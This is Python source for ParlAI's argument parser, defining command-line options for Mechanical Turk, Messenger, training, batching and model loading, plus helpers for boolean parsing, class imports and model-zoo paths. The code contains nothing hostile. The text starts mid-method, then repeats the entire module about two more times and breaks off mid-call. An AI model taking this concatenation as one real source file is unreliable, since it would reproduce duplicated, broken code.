        mturk.add_argument(
            '--unique', dest='unique_worker', default=False,
            action='store_true',
            help='enforce that no worker can work on your task twice')
        mturk.add_argument(
            '--unique-qual-name', dest='unique_qual_name',
            default=None, type=str,
            help='qualification name to use for uniqueness between HITs')
        mturk.add_argument(
            '-r', '--reward', default=0.05, type=float,
            help='reward for each worker for finishing the conversation, '
                 'in US dollars')
        mturk.add_argument(
            '--sandbox', dest='is_sandbox', action='store_true',
            help='submit the HITs to MTurk sandbox site')
        mturk.add_argument(
            '--live', dest='is_sandbox', action='store_false',
            help='submit the HITs to MTurk live site')
        mturk.add_argument(
            '--debug', dest='is_debug', action='store_true',
            help='print and log all server interactions and messages')
        mturk.add_argument(
            '--verbose', dest='verbose', action='store_true',
            help='print all messages sent to and from Turkers')
        mturk.add_argument(
            '--hard-block', dest='hard_block', action='store_true',
            default=False,
            help='Hard block disconnecting Turkers from all of your HITs')
        mturk.add_argument(
            '--log-level', dest='log_level', type=int, default=20,
            help='importance level for what to put into the logs. the lower '
                 'the level the more that gets logged. values are 0-50')
        mturk.add_argument(
            '--block-qualification', dest='block_qualification', default='',
            help='Qualification to use for soft blocking users. By default '
                 'turkers are never blocked, though setting this will allow '
                 'you to filter out turkers that have disconnected too many '
                 'times on previous HITs where this qualification was set.')
        mturk.add_argument(
            '--count-complete', dest='count_complete',
            default=False, action='store_true',
            help='continue until the requested number of conversations are '
                 'completed rather than attempted')
        mturk.add_argument(
            '--allowed-conversations', dest='allowed_conversations',
            default=0, type=int,
            help='number of concurrent conversations that one mturk worker '
                 'is able to be involved in, 0 is unlimited')
        mturk.add_argument(
            '--max-connections', dest='max_connections',
            default=30, type=int,
            help='number of HITs that can be launched at the same time, 0 is '
                 'unlimited.'
        )
        mturk.add_argument(
            '--min-messages', dest='min_messages',
            default=0, type=int,
            help='number of messages required to be sent by MTurk agent when '
                 'considering whether to approve a HIT in the event of a '
                 'partner disconnect. I.e. if the number of messages '
                 'exceeds this number, the turker can submit the HIT.'
        )
        mturk.add_argument(
            '--local', dest='local', default=False, action='store_true',
            help='Run the server locally on this server rather than setting up'
                 ' a heroku server.'
        )

        mturk.set_defaults(is_sandbox=True)
        mturk.set_defaults(is_debug=False)
        mturk.set_defaults(verbose=False)

    def add_messenger_args(self):
        messenger = self.add_argument_group('Facebook Messenger')
        messenger.add_argument(
            '--debug', dest='is_debug', action='store_true',
            help='print and log all server interactions and messages')
        messenger.add_argument(
            '--verbose', dest='verbose', action='store_true',
            help='print all messages sent to and from Turkers')
        messenger.add_argument(
            '--log-level', dest='log_level', type=int, default=20,
            help='importance level for what to put into the logs. the lower '
                 'the level the more that gets logged. values are 0-50')
        messenger.add_argument(
            '--force-page-token', dest='force_page_token', action='store_true',
            help='override the page token stored in the cache for a new one')
        messenger.add_argument(
            '--password', dest='password', type=str, default=None,
            help='Require a password for entry to the bot')
        messenger.add_argument(
            '--local', dest='local', action='store_true', default=False,
            help='Run the server locally on this server rather than setting up'
                 ' a heroku server.'
        )

        messenger.set_defaults(is_debug=False)
        messenger.set_defaults(verbose=False)

    def add_parlai_args(self, args=None):
        default_downloads_path = os.path.join(self.parlai_home, 'downloads')
        parlai = self.add_argument_group('Main ParlAI Arguments')
        parlai.add_argument(
            '-t', '--task',
            help='ParlAI task(s), e.g. "babi:Task1" or "babi,cbt"')
        parlai.add_argument(
            '--download-path', default=default_downloads_path,
            help='path for non-data dependencies to store any needed files.'
                 'defaults to {parlai_dir}/downloads')
        parlai.add_argument(
            '-dt', '--datatype', default='train',
            choices=['train', 'train:stream', 'train:ordered',
                     'train:ordered:stream', 'train:stream:ordered',
                     'valid', 'valid:stream', 'test', 'test:stream'],
            help='choose from: train, train:ordered, valid, test. to stream '
                 'data add ":stream" to any option (e.g., train:stream). '
                 'by default: train is random with replacement, '
                 'valid is ordered, test is ordered.')
        parlai.add_argument(
            '-im', '--image-mode', default='raw', type=str,
            help='image preprocessor to use. default is "raw". set to "none" '
                 'to skip image loading.')
        parlai.add_argument(
            '-nt', '--numthreads', default=1, type=int,
            help='number of threads. If batchsize set to 1, used for hogwild; '
                 'otherwise, used for number of threads in threadpool loading,'
                 ' e.g. in vqa')
        parlai.add_argument(
            '--hide-labels', default=False, type='bool',
            help='default (False) moves labels in valid and test sets to the '
                 'eval_labels field. If True, they are hidden completely.')
        batch = self.add_argument_group('Batching Arguments')
        batch.add_argument(
            '-bs', '--batchsize', default=1, type=int,
            help='batch size for minibatch training schemes')
        batch.add_argument('-bsrt', '--batch-sort', default=True, type='bool',
                           help='If enabled (default True), create batches by '
                                'flattening all episodes to have exactly one '
                                'utterance exchange and then sorting all the '
                                'examples according to their length. This '
                                'dramatically reduces the amount of padding '
                                'present after examples have been parsed, '
                                'speeding up training.')
        batch.add_argument('-clen', '--context-length', default=-1, type=int,
                           help='Number of past utterances to remember when '
                                'building flattened batches of data in multi-'
                                'example episodes.')
        batch.add_argument('-incl', '--include-labels',
                           default=True, type='bool',
                           help='Specifies whether or not to include labels '
                                'as past utterances when building flattened '
                                'batches of data in multi-example episodes.')
        self.add_parlai_data_path(parlai)

    def add_model_args(self):
        """Add arguments related to models such as model files."""
        model_args = self.add_argument_group('ParlAI Model Arguments')
        model_args.add_argument(
            '-m', '--model', default=None,
            help='the model class name. can match parlai/agents/<model> for '
                 'agents in that directory, or can provide a fully specified '
                 'module for `from X import Y` via `-m X:Y` '
                 '(e.g. `-m parlai.agents.seq2seq.seq2seq:Seq2SeqAgent`)')
        model_args.add_argument(
            '-mf', '--model-file', default=None,
            help='model file name for loading and saving models')
        model_args.add_argument(
            '--dict-class',
            help='the class of the dictionary agent uses')

    def add_model_subargs(self, model):
        """Add arguments specific to a particular model."""
        agent = get_agent_module(model)
        try:
            if hasattr(agent, 'add_cmdline_args'):
                agent.add_cmdline_args(self)
        except argparse.ArgumentError:
            # already added
            pass
        try:
            if hasattr(agent, 'dictionary_class'):
                s = class2str(agent.dictionary_class())
                self.set_defaults(dict_class=s)
        except argparse.ArgumentError:
            # already added
            pass

    def add_task_args(self, task):
        """Add arguments specific to the specified task."""
        for t in ids_to_tasks(task).split(','):
            agent = get_task_module(t)
            try:
                if hasattr(agent, 'add_cmdline_args'):
                    agent.add_cmdline_args(self)
            except argparse.ArgumentError:
                # already added
                pass

    def add_image_args(self, image_mode):
        """Add additional arguments for handling images."""
        try:
            parlai = self.add_argument_group('ParlAI Image Preprocessing Arguments')
            parlai.add_argument('--image-size', type=int, default=256,
                                help='resizing dimension for images')
            parlai.add_argument('--image-cropsize', type=int, default=224,
                                help='crop dimension for images')
        except argparse.ArgumentError:
            # already added
            pass


    def add_extra_args(self, args=None):
        """Add more args depending on how known args are set."""
        parsed = vars(self.parse_known_args(nohelp=True)[0])                    

        # find which image mode specified if any, and add additional arguments
        image_mode = parsed.get('image_mode', None)
        if image_mode is not None and image_mode != 'none':
            self.add_image_args(image_mode)

        # find which task specified if any, and add its specific arguments
        task = parsed.get('task', None)
        if task is not None:
            self.add_task_args(task)
        evaltask = parsed.get('evaltask', None)
        if evaltask is not None:
            self.add_task_args(evaltask)

        # find which model specified if any, and add its specific arguments
        model = parsed.get('model', None)
        if model is not None:
            self.add_model_subargs(model)

        # reset parser-level defaults over any model-level defaults
        try:
            self.set_defaults(**self._defaults)
        except AttributeError:
            raise RuntimeError('Please file an issue on github that argparse '
                               'got an attribute error when parsing.')


    def parse_known_args(self, args=None, namespace=None, nohelp=False):
        """Custom parse known args to ignore help flag."""
        if nohelp:
            # ignore help
            args = sys.argv[1:] if args is None else args
            args = [a for a in args if a != '-h' and a != '--help']
        return super().parse_known_args(args, namespace)


    def parse_args(self, args=None, namespace=None, print_args=True):
        """Parses the provided arguments and returns a dictionary of the
        ``args``. We specifically remove items with ``None`` as values in order
        to support the style ``opt.get(key, default)``, which would otherwise
        return ``None``.
        """
        self.add_extra_args(args)
        self.args = super().parse_args(args=args)
        self.opt = vars(self.args)

        # custom post-parsing
        self.opt['parlai_home'] = self.parlai_home
        if 'batchsize' in self.opt and self.opt['batchsize'] <= 1:
            # hide batch options
            self.opt.pop('batch_sort', None)
            self.opt.pop('context_length', None)

        # set environment variables
        if self.opt.get('download_path'):
            os.environ['PARLAI_DOWNPATH'] = self.opt['download_path']
        if self.opt.get('datapath'):
            os.environ['PARLAI_DATAPATH'] = self.opt['datapath']

        # map filenames that start with 'models:' to point to the model zoo dir
        if self.opt.get('model_file') is not None:
            self.opt['model_file'] = modelzoo_path(self.opt.get('datapath'),
                                                   self.opt['model_file'])
        if self.opt.get('dict_file') is not None:
            self.opt['dict_file'] = modelzoo_path(self.opt.get('datapath'),
                                                  self.opt['dict_file'])

        # set all arguments specified in commandline as overridable
        option_strings_dict = {}
        store_true = []
        store_false = []
        for group in self._action_groups:
            for a in group._group_actions:
                if hasattr(a, 'option_strings'):
                    for option in a.option_strings:
                        option_strings_dict[option] = a.dest
                        if '_StoreTrueAction' in str(type(a)):
                            store_true.append(option)
                        elif '_StoreFalseAction' in str(type(a)):
                            store_false.append(option)

        for i in range(len(self.cli_args)):
            if self.cli_args[i] in option_strings_dict:
                if self.cli_args[i] in store_true:
                    self.overridable[option_strings_dict[self.cli_args[i]]] = \
                        True
                elif self.cli_args[i] in store_false:
                    self.overridable[option_strings_dict[self.cli_args[i]]] = \
                        False
                else:
                    if i < (len(self.cli_args) - 1) and \
                            self.cli_args[i+1][0] != '-':
                        self.overridable[option_strings_dict[self.cli_args[i]]] = \
                            self.cli_args[i+1]
        self.opt['override'] = self.overridable

        if print_args:
            self.print_args()

        return self.opt

    def print_args(self):
        """Print out all the arguments in this parser."""
        if not self.opt:
            self.parse_args(print_args=False)
        values = {}
        for key, value in self.opt.items():
            values[str(key)] = str(value)
        for group in self._action_groups:
            group_dict = {
                a.dest: getattr(self.args, a.dest, None)
                for a in group._group_actions
            }
            namespace = argparse.Namespace(**group_dict)
            count = 0
            for key in namespace.__dict__:
                if key in values:
                    if count == 0:
                        print('[ ' + group.title + ': ] ')
                    count += 1
                    print('[  ' + key + ': ' + values[key] + ' ]')

    def set_params(self, **kwargs):
        """Set overridable kwargs."""
        self.set_defaults(**kwargs)
        for k, v in kwargs.items():
            self.overridable[k] = v

# Copyright (c) 2017-present, Facebook, Inc.
# All rights reserved.
# This source code is licensed under the BSD-style license found in the
# LICENSE file in the root directory of this source tree. An additional grant
# of patent rights can be found in the PATENTS file in the same directory.
"""Provides an argument parser and a set of default command line options for
using the ParlAI package.
"""

import argparse
import importlib
import os
import sys
from parlai.core.agents import get_agent_module, get_task_module
from parlai.tasks.tasks import ids_to_tasks


def str2bool(value):
    v = value.lower()
    if v in ('yes', 'true', 't', '1', 'y'):
        return True
    elif v in ('no', 'false', 'f', 'n', '0'):
        return False
    else:
        raise argparse.ArgumentTypeError('Boolean value expected.')


def str2class(value):
    """From import path string, returns the class specified. For example, the
    string 'parlai.agents.drqa.drqa:SimpleDictionaryAgent' returns
    <class 'parlai.agents.drqa.drqa.SimpleDictionaryAgent'>.
    """
    if ':' not in value:
        raise RuntimeError('Use a colon before the name of the class.')
    name = value.split(':')
    module = importlib.import_module(name[0])
    return getattr(module, name[1])


def class2str(value):
    """Inverse of params.str2class()."""
    s = str(value)
    s = s[s.find('\'') + 1:s.rfind('\'')]  # pull out import path
    s = ':'.join(s.rsplit('.', 1))  # replace last period with ':'
    return s


def modelzoo_path(datapath, path):
    """If path starts with 'models', then we remap it to the model zoo path
    within the data directory (default is ParlAI/data/models).
    ."""
    if path is None:
        return None
    if not path.startswith('models:'):
        return path
    else:
        # Check if we need to download the model
        animal = path[7:path.rfind('/')].replace('/', '.')
        module_name = f"parlai.zoo.{animal}"
        print(module_name)
        try:
            my_module = importlib.import_module(module_name)
            download = getattr(my_module, 'download')
            download(datapath)
        except (ModuleNotFoundError, AttributeError):
            pass
        return os.path.join(datapath, 'models', path[7:])


class ParlaiParser(argparse.ArgumentParser):
    """Pseudo-extension of ``argparse`` which sets a number of parameters
    for the ParlAI framework. More options can be added specific to other
    modules by passing this object and calling ``add_arg()`` or
    ``add_argument()`` on it.

    For example, see ``parlai.core.dict.DictionaryAgent.add_cmdline_args``.
    """

    def __init__(self, add_parlai_args=True, add_model_args=False):
        """Initializes the ParlAI argparser.
        - add_parlai_args (default True) initializes the default arguments for
        ParlAI package, including the data download paths and task arguments.
        - add_model_args (default False) initializes the default arguments for
        loading models, including initializing arguments from that model.
        """
        super().__init__(description='ParlAI parser.', allow_abbrev=False,
                         conflict_handler='resolve')
        self.register('type', 'bool', str2bool)
        self.register('type', 'class', str2class)
        self.parlai_home = (os.path.dirname(os.path.dirname(os.path.dirname(
                            os.path.realpath(__file__)))))
        os.environ['PARLAI_HOME'] = self.parlai_home

        self.add_arg = self.add_argument

        # remember which args were specified on the command line
        self.cli_args = sys.argv
        self.overridable = {}

        if add_parlai_args:
            self.add_parlai_args()
        if add_model_args:
            self.add_model_args()

    def add_parlai_data_path(self, argument_group=None):
        if argument_group is None:
            argument_group = self
        default_data_path = os.path.join(self.parlai_home, 'data')
        argument_group.add_argument(
            '-dp', '--datapath', default=default_data_path,
            help='path to datasets, defaults to {parlai_dir}/data')

    def add_mturk_args(self):
        mturk = self.add_argument_group('Mechanical Turk')
        default_log_path = os.path.join(self.parlai_home, 'logs', 'mturk')
        mturk.add_argument(
            '--mturk-log-path', default=default_log_path,
            help='path to MTurk logs, defaults to {parlai_dir}/logs/mturk')
        mturk.add_argument(
            '-t', '--task',
            help='MTurk task, e.g. "qa_data_collection" or "model_evaluator"')
        mturk.add_argument(
            '-nc', '--num-conversations', default=1, type=int,
            help='number of conversations you want to create for this task')
        mturk.add_argument(
            '--unique', dest='unique_worker', default=False,
            action='store_true',
            help='enforce that no worker can work on your task twice')
        mturk.add_argument(
            '--unique-qual-name', dest='unique_qual_name',
            default=None, type=str,
            help='qualification name to use for uniqueness between HITs')
        mturk.add_argument(
            '-r', '--reward', default=0.05, type=float,
            help='reward for each worker for finishing the conversation, '
                 'in US dollars')
        mturk.add_argument(
            '--sandbox', dest='is_sandbox', action='store_true',
            help='submit the HITs to MTurk sandbox site')
        mturk.add_argument(
            '--live', dest='is_sandbox', action='store_false',
            help='submit the HITs to MTurk live site')
        mturk.add_argument(
            '--debug', dest='is_debug', action='store_true',
            help='print and log all server interactions and messages')
        mturk.add_argument(
            '--verbose', dest='verbose', action='store_true',
            help='print all messages sent to and from Turkers')
        mturk.add_argument(
            '--hard-block', dest='hard_block', action='store_true',
            default=False,
            help='Hard block disconnecting Turkers from all of your HITs')
        mturk.add_argument(
            '--log-level', dest='log_level', type=int, default=20,
            help='importance level for what to put into the logs. the lower '
                 'the level the more that gets logged. values are 0-50')
        mturk.add_argument(
            '--block-qualification', dest='block_qualification', default='',
            help='Qualification to use for soft blocking users. By default '
                 'turkers are never blocked, though setting this will allow '
                 'you to filter out turkers that have disconnected too many '
                 'times on previous HITs where this qualification was set.')
        mturk.add_argument(
            '--count-complete', dest='count_complete',
            default=False, action='store_true',
            help='continue until the requested number of conversations are '
                 'completed rather than attempted')
        mturk.add_argument(
            '--allowed-conversations', dest='allowed_conversations',
            default=0, type=int,
            help='number of concurrent conversations that one mturk worker '
                 'is able to be involved in, 0 is unlimited')
        mturk.add_argument(
            '--max-connections', dest='max_connections',
            default=30, type=int,
            help='number of HITs that can be launched at the same time, 0 is '
                 'unlimited.'
        )
        mturk.add_argument(
            '--min-messages', dest='min_messages',
            default=0, type=int,
            help='number of messages required to be sent by MTurk agent when '
                 'considering whether to approve a HIT in the event of a '
                 'partner disconnect. I.e. if the number of messages '
                 'exceeds this number, the turker can submit the HIT.'
        )
        mturk.add_argument(
            '--local', dest='local', default=False, action='store_true',
            help='Run the server locally on this server rather than setting up'
                 ' a heroku server.'
        )

        mturk.set_defaults(is_sandbox=True)
        mturk.set_defaults(is_debug=False)
        mturk.set_defaults(verbose=False)

    def add_messenger_args(self):
        messenger = self.add_argument_group('Facebook Messenger')
        messenger.add_argument(
            '--debug', dest='is_debug', action='store_true',
            help='print and log all server interactions and messages')
        messenger.add_argument(
            '--verbose', dest='verbose', action='store_true',
            help='print all messages sent to and from Turkers')
        messenger.add_argument(
            '--log-level', dest='log_level', type=int, default=20,
            help='importance level for what to put into the logs. the lower '
                 'the level the more that gets logged. values are 0-50')
        messenger.add_argument(
            '--force-page-token', dest='force_page_token', action='store_true',
            help='override the page token stored in the cache for a new one')
        messenger.add_argument(
            '--password', dest='password', type=str, default=None,
            help='Require a password for entry to the bot')
        messenger.add_argument(
            '--local', dest='local', action='store_true', default=False,
            help='Run the server locally on this server rather than setting up'
                 ' a heroku server.'
        )

        messenger.set_defaults(is_debug=False)
        messenger.set_defaults(verbose=False)

    def add_parlai_args(self, args=None):
        default_downloads_path = os.path.join(self.parlai_home, 'downloads')
        parlai = self.add_argument_group('Main ParlAI Arguments')
        parlai.add_argument(
            '-t', '--task',
            help='ParlAI task(s), e.g. "babi:Task1" or "babi,cbt"')
        parlai.add_argument(
            '--download-path', default=default_downloads_path,
            help='path for non-data dependencies to store any needed files.'
                 'defaults to {parlai_dir}/downloads')
        parlai.add_argument(
            '-dt', '--datatype', default='train',
            choices=['train', 'train:stream', 'train:ordered',
                     'train:ordered:stream', 'train:stream:ordered',
                     'valid', 'valid:stream', 'test', 'test:stream'],
            help='choose from: train, train:ordered, valid, test. to stream '
                 'data add ":stream" to any option (e.g., train:stream). '
                 'by default: train is random with replacement, '
                 'valid is ordered, test is ordered.')
        parlai.add_argument(
            '-im', '--image-mode', default='raw', type=str,
            help='image preprocessor to use. default is "raw". set to "none" '
                 'to skip image loading.')
        parlai.add_argument(
            '-nt', '--numthreads', default=1, type=int,
            help='number of threads. If batchsize set to 1, used for hogwild; '
                 'otherwise, used for number of threads in threadpool loading,'
                 ' e.g. in vqa')
        parlai.add_argument(
            '--hide-labels', default=False, type='bool',
            help='default (False) moves labels in valid and test sets to the '
                 'eval_labels field. If True, they are hidden completely.')
        batch = self.add_argument_group('Batching Arguments')
        batch.add_argument(
            '-bs', '--batchsize', default=1, type=int,
            help='batch size for minibatch training schemes')
        batch.add_argument('-bsrt', '--batch-sort', default=True, type='bool',
                           help='If enabled (default True), create batches by '
                                'flattening all episodes to have exactly one '
                                'utterance exchange and then sorting all the '
                                'examples according to their length. This '
                                'dramatically reduces the amount of padding '
                                'present after examples have been parsed, '
                                'speeding up training.')
        batch.add_argument('-clen', '--context-length', default=-1, type=int,
                           help='Number of past utterances to remember when '
                                'building flattened batches of data in multi-'
                                'example episodes.')
        batch.add_argument('-incl', '--include-labels',
                           default=True, type='bool',
                           help='Specifies whether or not to include labels '
                                'as past utterances when building flattened '
                                'batches of data in multi-example episodes.')
        self.add_parlai_data_path(parlai)

    def add_model_args(self):
        """Add arguments related to models such as model files."""
        model_args = self.add_argument_group('ParlAI Model Arguments')
        model_args.add_argument(
            '-m', '--model', default=None,
            help='the model class name. can match parlai/agents/<model> for '
                 'agents in that directory, or can provide a fully specified '
                 'module for `from X import Y` via `-m X:Y` '
                 '(e.g. `-m parlai.agents.seq2seq.seq2seq:Seq2SeqAgent`)')
        model_args.add_argument(
            '-mf', '--model-file', default=None,
            help='model file name for loading and saving models')
        model_args.add_argument(
            '--dict-class',
            help='the class of the dictionary agent uses')

    def add_model_subargs(self, model):
        """Add arguments specific to a particular model."""
        agent = get_agent_module(model)
        try:
            if hasattr(agent, 'add_cmdline_args'):
                agent.add_cmdline_args(self)
        except argparse.ArgumentError:
            # already added
            pass
        try:
            if hasattr(agent, 'dictionary_class'):
                s = class2str(agent.dictionary_class())
                self.set_defaults(dict_class=s)
        except argparse.ArgumentError:
            # already added
            pass

    def add_task_args(self, task):
        """Add arguments specific to the specified task."""
        for t in ids_to_tasks(task).split(','):
            agent = get_task_module(t)
            try:
                if hasattr(agent, 'add_cmdline_args'):
                    agent.add_cmdline_args(self)
            except argparse.ArgumentError:
                # already added
                pass

    def add_image_args(self, image_mode):
        """Add additional arguments for handling images."""
        try:
            parlai = self.add_argument_group('ParlAI Image Preprocessing Arguments')
            parlai.add_argument('--image-size', type=int, default=256,
                                help='resizing dimension for images')
            parlai.add_argument('--image-cropsize', type=int, default=224,
                                help='crop dimension for images')
        except argparse.ArgumentError:
            # already added
            pass


    def add_extra_args(self, args=None):
        """Add more args depending on how known args are set."""
        parsed = vars(self.parse_known_args(nohelp=True)[0])                    

        # find which image mode specified if any, and add additional arguments
        image_mode = parsed.get('image_mode', None)
        if image_mode is not None and image_mode != 'none':
            self.add_image_args(image_mode)

        # find which task specified if any, and add its specific arguments
        task = parsed.get('task', None)
        if task is not None:
            self.add_task_args(task)
        evaltask = parsed.get('evaltask', None)
        if evaltask is not None:
            self.add_task_args(evaltask)

        # find which model specified if any, and add its specific arguments
        model = parsed.get('model', None)
        if model is not None:
            self.add_model_subargs(model)

        # reset parser-level defaults over any model-level defaults
        try:
            self.set_defaults(**self._defaults)
        except AttributeError:
            raise RuntimeError('Please file an issue on github that argparse '
                               'got an attribute error when parsing.')


    def parse_known_args(self, args=None, namespace=None, nohelp=False):
        """Custom parse known args to ignore help flag."""
        if nohelp:
            # ignore help
            args = sys.argv[1:] if args is None else args
            args = [a for a in args if a != '-h' and a != '--help']
        return super().parse_known_args(args, namespace)


    def parse_args(self, args=None, namespace=None, print_args=True):
        """Parses the provided arguments and returns a dictionary of the
        ``args``. We specifically remove items with ``None`` as values in order
        to support the style ``opt.get(key, default)``, which would otherwise
        return ``None``.
        """
        self.add_extra_args(args)
        self.args = super().parse_args(args=args)
        self.opt = vars(self.args)

        # custom post-parsing
        self.opt['parlai_home'] = self.parlai_home
        if 'batchsize' in self.opt and self.opt['batchsize'] <= 1:
            # hide batch options
            self.opt.pop('batch_sort', None)
            self.opt.pop('context_length', None)

        # set environment variables
        if self.opt.get('download_path'):
            os.environ['PARLAI_DOWNPATH'] = self.opt['download_path']
        if self.opt.get('datapath'):
            os.environ['PARLAI_DATAPATH'] = self.opt['datapath']

        # map filenames that start with 'models:' to point to the model zoo dir
        if self.opt.get('model_file') is not None:
            self.opt['model_file'] = modelzoo_path(self.opt.get('datapath'),
                                                   self.opt['model_file'])
        if self.opt.get('dict_file') is not None:
            self.opt['dict_file'] = modelzoo_path(self.opt.get('datapath'),
                                                  self.opt['dict_file'])

        # set all arguments specified in commandline as overridable
        option_strings_dict = {}
        store_true = []
        store_false = []
        for group in self._action_groups:
            for a in group._group_actions:
                if hasattr(a, 'option_strings'):
                    for option in a.option_strings:
                        option_strings_dict[option] = a.dest
                        if '_StoreTrueAction' in str(type(a)):
                            store_true.append(option)
                        elif '_StoreFalseAction' in str(type(a)):
                            store_false.append(option)

        for i in range(len(self.cli_args)):
            if self.cli_args[i] in option_strings_dict:
                if self.cli_args[i] in store_true:
                    self.overridable[option_strings_dict[self.cli_args[i]]] = \
                        True
                elif self.cli_args[i] in store_false:
                    self.overridable[option_strings_dict[self.cli_args[i]]] = \
                        False
                else:
                    if i < (len(self.cli_args) - 1) and \
                            self.cli_args[i+1][0] != '-':
                        self.overridable[option_strings_dict[self.cli_args[i]]] = \
                            self.cli_args[i+1]
        self.opt['override'] = self.overridable

        if print_args:
            self.print_args()

        return self.opt

    def print_args(self):
        """Print out all the arguments in this parser."""
        if not self.opt:
            self.parse_args(print_args=False)
        values = {}
        for key, value in self.opt.items():
            values[str(key)] = str(value)
        for group in self._action_groups:
            group_dict = {
                a.dest: getattr(self.args, a.dest, None)
                for a in group._group_actions
            }
            namespace = argparse.Namespace(**group_dict)
            count = 0
            for key in namespace.__dict__:
                if key in values:
                    if count == 0:
                        print('[ ' + group.title + ': ] ')
                    count += 1
                    print('[  ' + key + ': ' + values[key] + ' ]')

    def set_params(self, **kwargs):
        """Set overridable kwargs."""
        self.set_defaults(**kwargs)
        for k, v in kwargs.items():
            self.overridable[k] = v

# Copyright (c) 2017-present, Facebook, Inc.
# All rights reserved.
# This source code is licensed under the BSD-style license found in the
# LICENSE file in the root directory of this source tree. An additional grant
# of patent rights can be found in the PATENTS file in the same directory.
"""Provides an argument parser and a set of default command line options for
using the ParlAI package.
"""

import argparse
import importlib
import os
import sys
from parlai.core.agents import get_agent_module, get_task_module
from parlai.tasks.tasks import ids_to_tasks


def str2bool(value):
    v = value.lower()
    if v in ('yes', 'true', 't', '1', 'y'):
        return True
    elif v in ('no', 'false', 'f', 'n', '0'):
        return False
    else:
        raise argparse.ArgumentTypeError('Boolean value expected.')


def str2class(value):
    """From import path string, returns the class specified. For example, the
    string 'parlai.agents.drqa.drqa:SimpleDictionaryAgent' returns
    <class 'parlai.agents.drqa.drqa.SimpleDictionaryAgent'>.
    """
    if ':' not in value:
        raise RuntimeError('Use a colon before the name of the class.')
    name = value.split(':')
    module = importlib.import_module(name[0])
    return getattr(module, name[1])


def class2str(value):
    """Inverse of params.str2class()."""
    s = str(value)
    s = s[s.find('\'') + 1:s.rfind('\'')]  # pull out import path
    s = ':'.join(s.rsplit('.', 1))  # replace last period with ':'
    return s


def modelzoo_path(datapath, path):
    """If path starts with 'models', then we remap it to the model zoo path
    within the data directory (default is ParlAI/data/models).
    ."""
    if path is None:
        return None
    if not path.startswith('models:'):
        return path
    else:
        # Check if we need to download the model
        animal = path[7:path.rfind('/')].replace('/', '.')
        module_name = f"parlai.zoo.{animal}"
        print(module_name)
        try:
            my_module = importlib.import_module(module_name)
            download = getattr(my_module, 'download')
            download(datapath)
        except (ModuleNotFoundError, AttributeError):
            pass
        return os.path.join(datapath, 'models', path[7:])


class ParlaiParser(argparse.ArgumentParser):
    """Pseudo-extension of ``argparse`` which sets a number of parameters
    for the ParlAI framework. More options can be added specific to other
    modules by passing this object and calling ``add_arg()`` or
    ``add_argument()`` on it.

    For example, see ``parlai.core.dict.DictionaryAgent.add_cmdline_args``.
    """

    def __init__(self, add_parlai_args=True, add_model_args=False):
        """Initializes the ParlAI argparser.
        - add_parlai_args (default True) initializes the default arguments for
        ParlAI package, including the data download paths and task arguments.
        - add_model_args (default False) initializes the default arguments for
        loading models, including initializing arguments from that model.
        """
        super().__init__(description='ParlAI parser.', allow_abbrev=False,
                         conflict_handler='resolve')
        self.register('type', 'bool', str2bool)
        self.register('type', 'class', str2class)
        self.parlai_home = (os.path.dirname(os.path.dirname(os.path.dirname(
                            os.path.realpath(__file__)))))
        os.environ['PARLAI_HOME'] = self.parlai_home

        self.add_arg = self.add_argument

        # remember which args were specified on the command line
        self.cli_args = sys.argv
        self.overridable = {}

        if add_parlai_args:
            self.add_parlai_args()
        if add_model_args:
            self.add_model_args()

    def add_parlai_data_path(self, argument_group=None):
        if argument_group is None:
            argument_group = self
        default_data_path = os.path.join(self.parlai_home, 'data')
        argument_group.add_argument(
            '-dp', '--datapath', default=default_data_path,
            help='path to datasets, defaults to {parlai_dir}/data')

    def add_mturk_args(self):
        mturk = self.add_argument_group('Mechanical Turk')
        default_log_path = os.path.join(self.parlai_home, 'logs', 'mturk')
        mturk.add_argument(
            '--mturk-log-path', default=default_log_path,
            help='path to MTurk logs, defaults to {parlai_dir}/logs/mturk')
        mturk.add_argument(
            '-t', '--task',
            help='MTurk task, e.g. "qa_data_collection" or "model_evaluator"')
        mturk.add_argument(
            '-nc', '--num-conversations', default=1, type=int,
            help='number of conversations you want to create for this task')
        mturk.add_argument(
            '--unique', dest='unique_worker', default=False,
            action='store_true',
            help='enforce that no worker can work on your task twice')
        mturk.add_argument(
            '--unique-qual-name', dest='unique_qual_name',
            default=None, type=str,
            help='qualification name to use for uniqueness between HITs')
        mturk.add_argument(
            '-r', '--reward', default=0.05, type=float,
            help='reward for each worker for finishing the conversation, '
                 'in US dollars')
        mturk.add_argument(
            '--sandbox', dest='is_sandbox', action='store_true',
            help='submit the HITs to MTurk sandbox site')
        mturk.add_argument(
            '--live', dest='is_sandbox', action='store_false',
            help='submit the HITs to MTurk live site')
        mturk.add_argument(
            '--debug', dest='is_debug', action='store_true',
            help='print and log all server interactions and messages')
        mturk.add_argument(
            '--verbose', dest='verbose', action='store_true',
            help='print all messages sent to and from Turkers')
        mturk.add_argument(
            '--hard-block', dest='hard_block', action='store_true',
            default=False,
            help='Hard block disconnecting Turkers from all of your HITs')
        mturk.add_argument(
            '--log-level', dest='log_level', type=int, default=20,
            help='importance level for what to put into the logs. the lower '
                 'the level the more that gets logged. values are 0-50')
        mturk.add_argument(
            '--block-qualification', dest='block_qualification', default='',
            help='Qualification to use for soft blocking users. By default '
                 'turkers are never blocked, though setting this will allow '
                 'you to filter out turkers that have disconnected too many '
                 'times on previous HITs where this qualification was set.')
        mturk.add_argument(
            '--count-complete', dest='count_complete',
            default=False, action='store_true',
            help='continue until the requested number of conversations are '
                 'completed rather than attempted')
        mturk.add_argument(
            '--allowed-conversations', dest='allowed_conversations',
            default=0, type=int,
            help='number of concurrent conversations that one mturk worker '
                 'is able to be involved in, 0 is unlimited')
        mturk.add_argument(
            '--max-connections', dest='max_connections',
            default=30, type=int,
            help='number of HITs that can be launched at the same time, 0 is '
                 'unlimited.'
        )
        mturk.add_argument(
            '--min-messages', dest='min_messages',
            default=0, type=int,
            help='number of messages required to be sent by MTurk agent when '
                 'considering whether to approve a HIT in the event of a '
                 'partner disconnect. I.e. if the number of messages '
                 'exceeds this number, the turker can submit the HIT.'
        )
        mturk.add_argument(
            '--local', dest='local', default=False, action='store_true',
            help='Run the server locally on this server rather than setting up'
                 ' a heroku server.'
        )

        mturk.set_defaults(is_sandbox=True)
        mturk.set_defaults(is_debug=False)
        mturk.set_defaults(verbose=False)

    def add_messenger_args(self):
        messenger = self.add_argument_group('Facebook Messenger')
        messenger.add_argument(
            '--debug', dest='is_debug', action='store_true',
            help='print and log all server interactions and messages')
        messenger.add_argument(
            '--verbose', dest='verbose', action='store_true',
            help='print all messages sent to and from Turkers')
        messenger.add_argument(
